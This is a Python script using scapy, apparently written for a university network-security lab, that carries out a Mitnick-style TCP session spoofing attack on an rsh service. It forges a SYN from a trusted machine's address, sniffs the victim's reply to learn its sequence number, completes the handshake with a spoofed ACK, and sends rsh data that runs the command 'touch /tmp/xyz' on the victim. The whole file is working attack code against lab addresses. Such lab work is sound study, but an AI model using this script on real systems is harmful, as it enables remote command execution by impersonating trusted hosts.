#!/usr/bin/python3
 
# Comments in quotation marks are from the scapy documentation
 
# ’U’: URG bit
# ’A’: ACK bit
# ’P’: PSH bit
# ’R’: RST bit
# ’S’: SYN bit
# ’F’: FIN bit
 
from scapy.all import *
import time
from random import randint
 
x_ip = "10.0.2.8"
x_port = 514
 
# srv_ip = "10.0.2.7" # Yaseen's machine
srv_ip = "10.0.2.15" # Alakbar's machine
srv_port = 1023
sequence = 778933536
data = "9090\x00seed\x00seed\x00touch /tmp/xyz\x00"
print("Inital sequence number: " + str(sequence))
 
def send_SYN(sip, dip, sport, dport, seq):
	ip = IP(src=sip, dst=dip)
	tcp = TCP(sport=sport, dport=dport, flags="S", seq=seq)
	packet = ip/tcp

	if tcp.flags == "S":
		print("Sending SYN to {}:{} from {}:{} with sequence number {}".format(sip, sport, dip, dport, sequence))
		# ls(packet) # "List available layers, or infos on a given layer class or name."
		send(packet)
	else:
		print("Error: TCP flag not set to SYN in send_SYN function. Quitting...")
		quit()
 
def send_ACK(sip, dip, sport, dport, seq, ack):
	ip = IP(src=sip, dst=dip)
	tcp = TCP(sport=sport, dport=dport, flags="A", seq=seq, ack=ack)
	packet = ip/tcp
 
	if tcp.flags == "A":
		print("Sending ACK to {}:{} from {}:{} with sequence number {} and acknowledgement {}".format(sip, sport, dip, dport, seq, ack))
		# ls(packet) # "List available layers, or infos on a given layer class or name."
		send(packet)
	else:
		print("Error: TCP flag not set to ACK in send_ACK function. Quitting...")
		quit()
 
def send_RSH_data(sip, dip, sport, dport, seq, ack, data):
	ip = IP(src=sip, dst=dip)
	tcp = TCP(sport=sport, dport=dport, flags="AP", seq=seq, ack=ack)
	packet = ip/tcp/data
 
	if tcp.flags == "AP":
		print("Sending ACK, PSH to {}:{} from {}:{} with sequence number {} and acknowledgement {} and data:".format(sip, sport, dip, dport, seq, ack))
		print(data)
		# ls(packet) # "List available layers, or infos on a given layer class or name."
		send(packet)
	else:
		print("Error: TCP flag not set to ACK in send_ACK function. Quitting...")
		quit()
 
sniffer = AsyncSniffer(count=5, filter="tcp")
 
sniffer.start()
 
send_SYN(srv_ip, x_ip, srv_port, x_port, sequence)

print("Waiting 1 second...")
time.sleep(1)
sniffer.stop()
 
results = sniffer.results
print(results)

for packet in results:
	if packet.haslayer(TCP):
		if packet[TCP].seq == sequence:
			print("Orginal sequence number: " + str(packet[TCP].seq))
			inital_seq = packet[TCP].seq
		else:
			print("Return sequence number: " + str(packet[TCP].seq))
			acknowledge = packet[TCP].seq

SEQa = sequence
SEQv = results[-1][TCP].seq
ACK  = SEQv + 1
SEQ  = results[-1][TCP].ack

"""
1. SEND - SEQa --> Victim
2. RECV - Victim --> SEQv and ACK=SEQa+1
3. SEND - ACK=SEQv+1 and SEQ=SEQa+1

"""

print("Waiting 1 second...")
time.sleep(1)

# sniff syn+ack response from victim
send_ACK(srv_ip, x_ip, srv_port, x_port, SEQ, ACK)

print("Waiting 1 second...")
time.sleep(1)

send_RSH_data(srv_ip, x_ip, srv_port, x_port, SEQ, ACK, data)